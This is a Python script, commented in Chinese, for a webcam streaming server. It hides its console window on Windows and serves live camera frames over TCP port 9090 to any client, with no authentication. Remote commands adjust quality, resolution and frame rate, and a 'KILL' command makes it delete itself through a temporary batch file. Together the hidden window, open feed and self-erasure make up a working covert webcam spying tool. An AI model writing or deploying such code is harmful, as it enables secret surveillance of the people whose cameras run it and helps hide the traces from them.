"""
摄像头提供端（服务端）
- 采集摄像头画面，通过TCP局域网传输
- 支持远程调节清晰度和分辨率
- 支持远程一键关闭并自删除
- 不保存任何录像
"""
import socket
import struct
import threading
import sys
import os
import time
import ctypes
import cv2


# 隐藏控制台窗口（打包后运行时）
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


class CameraServer:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 9090
        self.cap = None
        self.running = False
        self.quality = 70          # JPEG质量 1-100
        self.resolution = (640, 480)
        self.frame_interval = 0.03  # ~30fps
        self.clients = []
        self.lock = threading.Lock()
        self.kill_requested = False

    def init_camera(self):
        """初始化摄像头，尝试多个索引"""
        for idx in range(3):
            self.cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
            if self.cap.isOpened():
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.resolution[0])
                self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.resolution[1])
                self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                return True
        return False

    def read_frame(self):
        """读取并编码一帧"""
        ret, frame = self.cap.read()
        if not ret:
            return None
        # 缩放到目标分辨率
        if frame.shape[1] != self.resolution[0] or frame.shape[0] != self.resolution[1]:
            frame = cv2.resize(frame, self.resolution)
        # JPEG编码
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
        _, buf = cv2.imencode(".jpg", frame, encode_param)
        return buf.tobytes()

    def send_frame(self, conn, data):
        """发送一帧：4字节长度头 + 数据"""
        try:
            conn.sendall(struct.pack(">I", len(data)))
            conn.sendall(data)
            return True
        except Exception:
            return False

    def handle_client(self, conn, addr):
        """处理单个客户端连接"""
        print(f"[+] 客户端连接: {addr}")
        with self.lock:
            self.clients.append(conn)
        try:
            conn.settimeout(1.0)
            while self.running and not self.kill_requested:
                # 接收控制指令
                try:
                    cmd_data = conn.recv(64)
                    if cmd_data:
                        self.parse_command(cmd_data, conn)
                except socket.timeout:
                    pass
                except Exception:
                    break

                # 发送帧
                frame_data = self.read_frame()
                if frame_data is None:
                    break
                if not self.send_frame(conn, frame_data):
                    break
                time.sleep(self.frame_interval)
        finally:
            with self.lock:
                if conn in self.clients:
                    self.clients.remove(conn)
            try:
                conn.close()
            except Exception:
                pass
            print(f"[-] 客户端断开: {addr}")

    def parse_command(self, data, conn):
        """解析客户端控制指令"""
        try:
            text = data.decode("utf-8").strip().rstrip("\x00")
            parts = text.split(":")
            cmd = parts[0]

            if cmd == "QUALITY" and len(parts) == 2:
                q = int(parts[1])
                self.quality = max(1, min(100, q))
                print(f"[设置] 清晰度: {self.quality}")

            elif cmd == "RESOLUTION" and len(parts) == 2:
                w, h = parts[1].split("x")
                new_res = (int(w), int(h))
                if self.cap:
                    self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, new_res[0])
                    self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, new_res[1])
                self.resolution = new_res
                print(f"[设置] 分辨率: {self.resolution}")

            elif cmd == "FPS" and len(parts) == 2:
                fps = int(parts[1])
                if fps > 0:
                    self.frame_interval = 1.0 / fps
                print(f"[设置] 帧率: {fps}")

            elif cmd == "KILL":
                print("[!] 收到远程关闭指令")
                self.kill_requested = True
                self.running = False

        except Exception:
            pass

    def self_delete_and_exit(self):
        """自删除并退出"""
        time.sleep(0.5)
        if self.cap:
            self.cap.release()
        exe_path = os.path.abspath(sys.argv[0])
        # Windows下用cmd延迟删除自身
        if sys.platform == "win32":
            bat = f'@echo off\ntimeout /t 1 /nobreak >nul\ndel /f /q "{exe_path}"\ndel "%~f0"'
            temp_bat = os.path.join(os.environ.get("TEMP", "."), "_cleanup.bat")
            with open(temp_bat, "w") as f:
                f.write(bat)
            os.system(f'start /min cmd /c "{temp_bat}"')
        else:
            try:
                os.remove(exe_path)
            except Exception:
                pass
        os._exit(0)

    def run(self):
        hide_console()
        print("=" * 40)
        print("  摄像头提供端（服务端）")
        print("=" * 40)

        if not self.init_camera():
            print("[错误] 无法打开摄像头")
            input("按回车退出...")
            return

        print(f"[摄像头] 已打开，分辨率: {self.resolution}")

        # 获取本机IP
        local_ip = socket.gethostbyname(socket.gethostname())
        print(f"[网络] 本机IP: {local_ip}")
        print(f"[网络] 监听端口: {self.port}")
        print(f"[提示] 查看端连接地址: {local_ip}:{self.port}")
        print("-" * 40)

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.host, self.port))
        srv.listen(5)
        srv.settimeout(1.0)
        self.running = True

        # 接受连接线程
        def accept_loop():
            while self.running:
                try:
                    conn, addr = srv.accept()
                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    t = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                    t.start()
                except socket.timeout:
                    continue
                except Exception:
                    break

        accept_thread = threading.Thread(target=accept_loop, daemon=True)
        accept_thread.start()

        print("[运行中] 等待客户端连接... (Ctrl+C 退出)")
        try:
            while self.running and not self.kill_requested:
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass

        self.running = False
        if self.cap:
            self.cap.release()
        srv.close()

        if self.kill_requested:
            self.self_delete_and_exit()

        print("[已退出]")


if __name__ == "__main__":
    server = CameraServer()
    server.run()
